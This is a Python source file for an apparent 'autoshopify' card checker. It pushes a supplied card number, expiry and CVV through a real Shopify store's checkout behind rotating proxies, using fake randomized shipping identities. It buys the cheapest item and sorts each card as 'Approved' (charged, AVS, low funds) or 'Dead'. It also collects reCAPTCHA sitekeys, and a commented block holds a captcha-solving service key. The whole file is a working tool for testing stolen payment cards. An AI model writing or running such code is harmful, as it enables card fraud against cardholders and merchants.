import json
from random import randint, choice
from string import ascii_letters
from utilsdf.functions import random_email, capture, random_proxy, random_proxy_sh
from httpx import AsyncClient, Response, RemoteProtocolError, ProxyError, ReadTimeout
from urllib.parse import urlparse
from asyncio import sleep
from time import perf_counter


path_json_keysh = "assets/keysh.json"

HEADERS_BASE = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
}


async def autoshopify(
    url: str,
    card: str,
    month: str,
    year: str,
    cvv: str,
    is_premium: bool,
    credits: int,
) -> dict:
    """
    This function performs a Shopify autocheckout using the provided parameters.

    Args:
        url (str): The URL of the Shopify product to checkout.
        card (str): The credit card number to use for the checkout.
        month (str): The expiration month of the credit card.
        year (str): The expiration year of the credit card.
        cvv (str): The CVV code of the credit card.

    Returns:
        dict: A dictionary containing the results of the checkout process.
    """

    ini = perf_counter()

    # Validations
    if not isinstance(url, str):
        raise TypeError("'url' must be an instance of 'str'")
    if not isinstance(card, str):
        raise TypeError("'card' must be an instance of 'str'")
    if not isinstance(month, str):
        raise TypeError("'month' must be an instance of 'str'")
    if not isinstance(year, str):
        raise TypeError("'year' must be an instance of 'str'")
    if not isinstance(cvv, str):
        raise TypeError("'cvv' must be an instance of 'str'")
    result = url_validator(url)
    if not result:
        raise ValueError("Invalid URL")
    attempts = 0
    while True:
        async with AsyncClient(
            follow_redirects=True,
            timeout=40,
            verify=False,
            proxies=proxy_sh(is_premium, credits),
            headers=HEADERS_BASE,
        ) as s:
            try:
                url_request = await s.get(
                    url,
                )

                url_request = str(url_request.url)
                url_parsed = urlparse(url_request)
                url_base = url_parsed.scheme + "://" + url_parsed.netloc
                # 1 REQ - GET PRODUCT ID
                product_id = await get_product_id(f"{url_base}/products.json", s)
                if not product_id and "shoepalace" in str(url_base):
                    product_id = "32645128224814"
                if not product_id:
                    raise Exception("Product ID not found")

                # 2 REQ - Going to checkout and capture the first token
                params = {
                    "traffic_source": "buy_now",
                    "properties": "JTdCJTIyX192ZXJpZmljYXRpb24lMjIlM0ElMjJ2YWxpZCUyMiU3RA==",
                }

                checkout_request = await s.get(
                    f"{url_base}/cart/{product_id}:1",
                    params=params,
                )

                cl = checkout_request.headers.get("Content-Language")
                checkout_text = checkout_request.text

                url_checkout = checkout_request.url

                url_checkout_str = str(url_checkout)
                if "/c/" in url_checkout_str or "/cn/" in url_checkout_str:
                    raise Exception("graphql")

                first_token = generate_random_string(86)

                name = "Sachio" + str(randint(100, 999))
                last = "YT" + str(randint(100, 999)).upper()
                r = str(randint(100, 999))
                street = (r + " W " + r + " nd St ").upper()

                if cl and ("au" in cl or "cc" in cl or "nz" in cl or ".au" in url_base):
                    city = "Sydney"
                    state = "New South Wales"
                    statecode = "NSW"
                    country = "Australia"
                    countrycode = "AU"
                    zip_ = randint(2007, 2020)
                    phone = f"{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}"
                elif cl and ("ca" in cl or ".ca" in url_base):
                    city = "St-Léonard"
                    state = "Quebec"
                    statecode = "QC"
                    country = "Canada"
                    countrycode = "CA"
                    zip_ = "H1S 1N2"
                    phone = f"{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}"
                else:
                    city = "New York"
                    state = "New York"
                    statecode = "NY"
                    country = "United States"
                    countrycode = "US"
                    zip_ = randint(10004, 10033)
                    phone = (
                        f"1{randint(100, 999)}{randint(100, 999)}{randint(100, 999)}"
                    )

                city = city.upper()
                state = state.upper()
                country = country.upper()

                # 3 REQ - INFORMATION

                data_ship = {
                    "_method": "patch",
                    "authenticity_token": first_token,
                    "previous_step": "contact_information",
                    "step": "shipping_method",
                    "checkout[email]": random_email(),
                    "checkout[buyer_accepts_marketing]": "0",
                    "checkout[shipping_address][first_name]": name,
                    "checkout[shipping_address][first_name]": name,
                    "checkout[shipping_address][last_name]": last,
                    "checkout[shipping_address][last_name]": last,
                    "checkout[shipping_address][address1]": street,
                    "checkout[shipping_address][address1]": street,
                    "checkout[shipping_address][address2]": "",
                    "checkout[shipping_address][address2]": "",
                    "checkout[shipping_address][city]": city,
                    "checkout[shipping_address][city]": city,
                    "checkout[shipping_address][country]": countrycode,
                    "checkout[shipping_address][country]": country,
                    "checkout[shipping_address][province]": state,
                    "checkout[shipping_address][province]": statecode,
                    "checkout[shipping_address][zip]": zip_,
                    "checkout[shipping_address][zip]": zip_,
                    "checkout[shipping_address][phone]": phone,
                    "checkout[shipping_address][phone]": phone,
                    "checkout[remember_me]": "",
                    "checkout[remember_me]": 0,
                    "checkout[client_details][browser_width]": "360",
                    "checkout[client_details][browser_height]": "621",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }

                # if premiun:
                #     try:
                #         with open(path_json_keysh, "r") as f:
                #             data2 = json.load(f)
                #     except FileNotFoundError:
                #         data2 = {}

                #     captcha_key = data2.get(url_base)
                #     if captcha_key == None:
                #         captcha_key = "6LeoeSkTAAAAAA9rkZs5oS82l69OEYjKRZAiKdaF"
                #     captcha = await two_captcha(
                #         "d44b40fec66f22986ae797c36ccdf554", url_base, captcha_key, False
                #     )

                #     data_ship.append(("g-recaptcha-response", captcha))

                information_request = await s.post(
                    url_checkout,
                    data=data_ship,
                )
                information_response = information_request.text

                await request_shipping_method(
                    s, url_checkout, first_token, information_response
                )

                # 4 REQ - Going to payment method
                params = {"previous_step": "shipping_method", "step": "payment_method"}
                previous_step_request = await s.get(
                    url_checkout,
                    params=params,
                )
                previous_step_response = previous_step_request.text

                payment_gateway = capture(
                    previous_step_response, 'data-select-gateway="', '"'
                )
                if not payment_gateway:
                    raise Exception("'payment_gateway' not found")
                total_price = capture(
                    previous_step_response, 'data-checkout-payment-due-target="', '"'
                )

                # 5 REQ - SESSION PAY
                json_data = {
                    "credit_card": {
                        "number": card,
                        "name": name,
                        "month": int(month),
                        "year": int(year),
                        "verification_value": cvv,
                    },
                    "payment_session_scope": url_parsed.netloc,
                }

                headers = {
                    "Accept": "application/json",
                    "Accept-Language": "es,es-ES;q=0.9,en;q=0.8,pt;q=0.7,am;q=0.6",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Origin": "https://checkout.shopifycs.com",
                    "Pragma": "no-cache",
                    "Referer": "https://checkout.shopifycs.com/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                }

                session_pay_request = await s.post(
                    "https://deposit.us.shopifycs.com/sessions",
                    json=json_data,
                    headers=headers,
                )
                session_pay_response = session_pay_request.text

                if not '"id"' in session_pay_response.lower():
                    raise ValueError("Invalid CC")
                session_pay_response = session_pay_request.json()

                s_card = session_pay_response["id"]

                # 6 REQ - PAY REQUEST

                data_pay = {
                    "_method": "patch",
                    "authenticity_token": first_token,
                    "previous_step": "payment_method",
                    "step": "",
                    "s": s_card,
                    "checkout[payment_gateway]": payment_gateway,
                    "checkout[credit_card][vault]": "false",
                    "checkout[different_billing_address]": "false",
                    "checkout[vault_phone]": phone,
                    "checkout[total_price]": total_price,
                    "complete": "1",
                    "checkout[client_details][browser_width]": "360",
                    "checkout[client_details][browser_height]": "621",
                    "checkout[client_details][javascript_enabled]": "1",
                    "checkout[client_details][color_depth]": "24",
                    "checkout[client_details][java_enabled]": "false",
                    "checkout[client_details][browser_tz]": "300",
                }

                pay = await s.post(
                    url_checkout,
                    data=data_pay,
                )
                pay_t = pay.text
                sitekey = capture(pay_t, 'sitekey: "', '"')

                if "I'm not a robot" in pay_t or "reCAPTCHA" in pay_t:
                    try:
                        with open(path_json_keysh, "r") as f:
                            data = json.load(f)
                    except FileNotFoundError:
                        data = {}

                    if sitekey:
                        data.update({url_base: sitekey})

                        with open(path_json_keysh, "w") as f:
                            json.dump(data, f, indent=2)

                await sleep(5)

                # 7 REQ FINAL

                requests_final = await s.get(
                    f"{url_checkout}?from_processing_page=1&validate=true",
                )
                requests_final_response = requests_final.text

                # REVIEW ORDER
                if "Review order" in requests_final_response:
                    data = {
                        "_method": "patch",
                        "authenticity_token": first_token,
                        "checkout[client_details][browser_width]": "774",
                        "checkout[client_details][browser_height]": "657",
                        "checkout[client_details][javascript_enabled]": "1",
                        "checkout[client_details][color_depth]": "24",
                        "checkout[client_details][java_enabled]": "false",
                        "checkout[client_details][browser_tz]": "360",
                    }
                    await s.post(url_checkout, data=data)
                    session_pay_request = await s.post(
                        "https://deposit.us.shopifycs.com/sessions",
                        json=json_data,
                        headers=headers,
                    )
                    session_pay_response = session_pay_request.json()

                    s_card = session_pay_response["id"]
                    data_pay["s"] = s_card
                    await s.post(
                        url_checkout,
                        data=data_pay,
                    )
                    await sleep(5)
                    requests_final = await s.get(
                        f"{url_checkout}?from_processing_page=1&validate=true",
                    )
                    requests_final_response = requests_final.text
                # with open("test.html", "w", encoding="utf-8") as f:
                #     f.write(requests_final_response)
                msg = capture(
                    requests_final_response, '<p class="notice__text">', "</p>"
                )

                final = perf_counter() - ini
                status = await get_status(requests_final, msg, total_price)
                return {
                    "site": url_parsed.netloc,
                    "response": status[0],
                    "status": status[1],
                    "total": total_price,
                    "time": f"{final:0.3}",
                }
            except (RemoteProtocolError, ReadTimeout, ProxyError) as e:
                attempts += 1
                if attempts >= 10:
                    raise e
                continue


async def get_product_id(url: str, session: AsyncClient) -> int | None:
    """
    Gets the id of the product with the lowest cost, returns None in case of any failure

    Args:
    url (str): The url of the product page
    session (AsyncClient): The aiohttp session object

    Returns:
    int: The id of the product with the lowest cost, or None if there was a failure
    """
    response = await session.get(url)
    response_data = response.json()

    products_data = response_data["products"]
    products = {}
    for product in products_data:
        variants = product["variants"]
        variant = variants[0]
        product_id = variant["id"]
        available = variant["available"]
        price = float(variant["price"])
        if price < 0.1:
            continue
        if available:
            products[product_id] = price
    if products:
        min_price_product_id = min(products, key=products.get)
        return min_price_product_id

    return None


async def get_status(
    request_response: Response, response_shopify: str, price: str
) -> tuple:
    """
    Determines the status of a Shopify order based on the response from the server and the price of the order.

    Args:
    request_response (Response): The response object from the Shopify server
    response_shopify (str): The response message from the Shopify server
    price (str): The price of the order

    Returns:
    tuple: A tuple containing the message to be displayed and the status of the order
    """
    url = str(request_response.url)
    msg = response_shopify
    responses = json.load(open("assets/responses.json"))
    if "thank_you" in url or "post_purchase" in url:
        status1 = "Approved! ✅ -» charged!"
        msg = f"Thank You! -» {price[:2]}$"
    elif "3d_secure_2" in url:
        msg = "3d_secure_2"
    elif not msg:
        raise Exception("Response not found")
    elif response_shopify in responses["avs"]:
        status1 = "Approved! ✅ -» avs"
    elif response_shopify in responses["low_funds"]:
        status1 = "Approved! ✅ -» low funds"
    elif response_shopify in responses["ccn"]:
        status1 = "Approved! ✅ -» ccn"
    else:
        status1 = "Dead! ❌"
    return msg, status1


generate_random_string = lambda length: "".join(
    choice(ascii_letters) for _ in range(length)
)


async def request_shipping_method(s, url_checkout, first_token, information_response):
    shipping = None
    data = {
        "_method": "patch",
        "authenticity_token": first_token,
        "previous_step": "shipping_method",
        "step": "payment_method",
        "checkout[shipping_rate][id]": "",
        "checkout[client_details][browser_width]": "774",
        "checkout[client_details][browser_height]": "657",
        "checkout[client_details][javascript_enabled]": "1",
        "checkout[client_details][color_depth]": "24",
        "checkout[client_details][java_enabled]": "false",
        "checkout[client_details][browser_tz]": "360",
    }
    for _ in range(3):
        shipping = find_shipping_method(information_response)
        if shipping:
            break

        shipping = "shopify-Economy-5"  # metodo para obtener el shipping
        data["checkout[shipping_rate][id]"] = shipping
        shipping_request = await s.post(
            url_checkout,
            data=data,
        )  # da error y nos proporciona el shipping
        information_response = shipping_request.text

    if not shipping:
        raise Exception("Shipping not found after 3 attempts")
    data["checkout[shipping_rate][id]"] = shipping
    await s.post(
        url_checkout,
        data=data,
    )


def find_shipping_method(response):
    ship1 = capture(response, '<div class="radio-wrapper" data-shipping-method="', '">')
    ship2 = capture(response, 'shipping-method="', '"')
    ship3 = capture(response, 'type="radio" value="', '"')
    ship4 = capture(response, 'data-shipping-method="', '"')
    ship5 = capture(response, 'data-backup="', '"')
    ship6 = capture(response, 'shipping-method="', '"')

    return next(
        (ship for ship in [ship1, ship2, ship3, ship4, ship5, ship6] if ship), None
    )


def proxy_sh(is_premium: True, credits: int):
    proxy = random_proxy()

    if is_premium or credits > 10:
        proxy = random_proxy_sh()
    return proxy
